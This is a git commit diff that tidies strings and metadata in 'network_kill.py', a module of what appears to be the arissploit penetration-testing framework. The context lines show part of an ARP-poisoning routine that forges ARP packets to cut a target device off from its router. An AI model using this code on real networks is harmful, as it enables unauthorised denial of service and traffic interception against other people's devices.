bbe446bba8865a9594e0c5d3e7a1e6dc99cf5481
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2019-10-06 18:42:51 +0300

    Update network_kill.py

--- modules/network_kill.py
+++ modules/network_kill.py
@@ -1,5 +1,3 @@
-
-
 from core.arissploit import *
 import os
 import signal
@@ -11,10 +9,8 @@ from core import colors
 conf = {
 	"name": "network_kill",
 	"version": "1.0",
-	"shortdesc": "blocks communication between router and target",
-	"author": "entynetproject",
-	"github": "entynetproject",
-	"email": "entynetproject0@gmail.com",
+	"shortdesc": "Blocks communication between router and target.",
+	"author": "Entynetproject",
 	"initdate": "24.2.2016",
 	"lastmod": "29.12.2016",
 	"apisupport": False,
@@ -23,19 +19,19 @@ conf = {
 
 # List of variables
 variables = OrderedDict((
-	('target', ['192.168.1.2', "target device's ip"]),
-	('router', ['192.168.1.1', "router's ip"]),
+	('target', ['192.168.1.2', "Target device ip."]),
+	('router', ['192.168.1.1', "Router's ip."]),
 ))
 
 # Additional help notes
-help_notes = colors.red+"this module will not work without root permission!\n this doesn't work if target refuses from arp request!"+colors.end
+help_notes = colors.red+"This module will not work without root permission!\n this doesn't work if target refuses from arp request!"+colors.end
 
 #simple changelog
 changelog = "Version 1.0:\nrelease"
 
 def run():
-	printInfo("arp poisoning has been started!")
-	printInfo("[*] ctrl + c to end")
+	printInfo("Arp poisoning has been started...")
+	printInfo("Ctrl + C to end.")
 	packet = ARP()
 	packet.psrc = variables['router'][0]
 	packet.pdst = variables['target'][0]
